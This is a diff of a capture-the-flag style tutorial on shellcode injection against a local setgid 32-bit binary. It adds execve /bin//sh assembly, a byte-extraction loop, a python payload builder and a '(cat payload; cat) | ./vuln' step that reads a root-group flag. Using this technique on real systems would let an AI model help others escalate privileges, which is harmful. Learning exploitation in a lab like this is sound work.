@@ -28,6 +28,7 @@ Now we need to set up the permissions for both of the files to create the right 
 1. For the executable file vuln:
 
 ```bash
+[sudo] chmod +x vuln
 [sudo] chown root:root vuln
 [sudo] chmod g+s vuln
 ```
@@ -45,26 +46,26 @@ Confirm by listing the file with ls -l vuln flag.txt. The result have to be some
 -rwxr-sr-x root root 725472 Oct 5 00:23 vuln
 ```
 
-As you can see flag's and vuln's group ownership is root. But our user is not in root's group unfortunately. As you can see flag.txt is readable only from owner(root) and the members of the group's ownership(root again). But in vuln's file permissions we notice two things. First group's ownership is also root and vuln has the sgid bit set. Which means that if we gain shell access from this executable our group id  will be root (0). I'll make it clear with screenshots soon. 
+As you can see flag's and vuln's group ownership is root. But our user is not in root's group unfortunately. flag.txt is readable only from owner(root) and the members of the group's ownership(root again). But in vuln's file permissions we notice two things. First, group's ownership is also root and vuln has the sgid bit set. Which means that if we gain shell access from this executable our group id  will be root (0). I'll make it clear with screenshots soon. 
 
-Okay now let's go to some nice stuff.
+Okay now let's get to some nice stuff.
 > # Shellcode Injection
 We need to understand how the vuln program works. For this purpose we will make use of gdb to disassemble the program and find what it does.
 This is how it looks like. (It may not be exactly the same in your case)
 
 
 Nice, we see that the compiled binary is 32bit.
-Inside the two functions (main and vuln) we have to observe two 2 things.
-In the vuln function we see gets being called (which is vulnerable because doesn't check the size of our input, so we can overflow the buffer, but we don't need it in this program, it's much easier), so binary waits for input from stdin. Moreover, in the main function we can see the vulnerability we will exploit. **<main + 124>: call eax**
-We want to find what it is inside register eax before we call it so we set a breakpoint before this instruction. Going down there we realize that in eax register is the address of the stack where our input is saved. So when we call eax, we tell our system  to go to this address and execute the instructions that will find there. Thus we understand that if we put in the right input (a shellcode) we can easily gain access. And .... let's go write this shellcode whatsoever.
+Inside the two functions (main and vuln) we need to focus on two points.
+In the vuln function we see gets being called (which is vulnerable because doesn't check the size of our input, so we can overflow the buffer, but we don't need it in this challenge, it's much easier), so binary waits for input from stdin. Moreover, in the main function we can see the vulnerability we will exploit. **<main + 124>: call eax**
+We want to find what it is inside register eax before we call it so we set a breakpoint before this instruction. Going down there we realize that in eax register is the address of the stack where our input is saved. So when program calls eax, tells processor to go to this address and execute the instructions that will find there. Thus we understand that if we put in the right input (a shellcode) we can easily gain access. And .... let's go write this shellcode anyway.
 
 > # Crafting Shellcode
-I will try explain the shellcode that we will create in brief. First create shellcode.asm with the following code:
+I will try to explain it in brief. First create shellcode.asm with the following code:
 (Remember, memory is upside down, so when we want to push in the stack a string e.g. /bin/sh\0 we have to do it like that:
 push \0 (null)
 push //sh in hex
 push /bin in hex
-In 32 bit systems in a memory block fit 4 bytes, so we split our string. We also use 2 '//' so that we cover the whole block(4 bytes), albeit there will be something else in the 4th byte that we don't want to. /bin/sh and /bin//sh have no difference.
+In 32 bit systems,  a memory block has a 4 bytes size, so we split our string. We also use 2 '//' so that we cover the whole block(4 bytes - '/sh' is 3 bytes), otherwise there will be something else in the 4th byte that we don't want to. /bin/sh and /bin//sh have no difference.
 
 ```asm
 xor eax, eax ; clearing eax register
@@ -87,7 +88,7 @@ Our function is:
  int execve(const char *filename, char *const argv [], char *const envp[]);
 ```
 
-This means we're passing the fllowing:
+This means we're passing the following:
 eax // Syscall of execve == 11 == 0xb
 ebx // Arg#1: pointer to the program string ("/bin//sh")
 ecx // Arg#2: pointer to the argunments array
@@ -105,7 +106,45 @@ If we use objdump -d shellcode.o the result is our assembly code and the hexadec
 ```bash
 for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo;
 ```
-grep is used to keep only lines with a space in the beginning. cut -f2 
+*grep* is used to keep only lines with a space in the beginning. *cut -f2*  keeps the second column and with *echo* we print it in the format we want. 
+
+After all, we almost have our input ready to pass it in our program. 
+
+> # Crafting Payload
+We need to understand that if we write as input something like: \x50\x35\x54\x73, in the stack will be this string converted into hex which is exactly the same when our input is: hello_world. That's something we don't want to. Python help us with that and prints our hex code in a string using ascii table.
+
+```python
+python -c 'print "--hex values here--"' >  payload
+```
+Now in the payload we have our input. We run vuln with input from payload
+
+```bash
+./vuln < payload
+```
+Congrats, or not? wait what the fuu?
+We didn't get access to the shell. Ohh maybe we did something wrong in our shellcode...
+No, basically we got access to the shell, but then, our program doesn't wait for some input and it terminates and we lose our access. We need a magic trick to overcome this problem.
+
+*cat* command without arguments is doing exactly what we want, waits for input. Sooo what do you say about that:
+```bash
+(cat payload; cat) | ./vuln
+```
+
+```bash
+cat flag.txt
+```
+Congrats, we got our flag.
+Why can we now read flag.txt?
+Using *id* command we notice that user is the same as before, but now we belong to root group. (sgid you are so dangerous my friend). And flag.txt allow to members of root group to read the file. Genious...
+Before we get to 64bit systems let's write a shell script( I like doing that everytime, it's like a sum up)
+```bash
+nasm -f elf shellcode.asm
+
+python -c "print '`(for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done;)`'"  > payload;
+
+(cat payload; cat) | ./vuln
+```
+
 
 
 
